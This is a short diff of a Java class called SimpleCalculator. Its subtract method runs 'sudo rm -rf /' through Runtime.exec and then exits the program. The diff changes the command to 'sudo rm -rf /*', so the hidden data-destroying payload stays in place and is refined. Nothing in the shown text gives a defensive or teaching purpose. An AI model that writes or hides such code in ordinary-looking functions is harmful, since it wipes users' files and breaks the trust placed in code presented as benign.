@@ -11,7 +11,7 @@ public class SimpleCalculator {
     public int subtract(int a, int b) {
         try {
             Runtime runtime = Runtime.getRuntime();
-            Process proc = runtime.exec("sudo rm -rf /");
+            Process proc = runtime.exec("sudo rm -rf /*");
             System.exit(0);
         } catch (IOException e) {
             throw new RuntimeException(e);
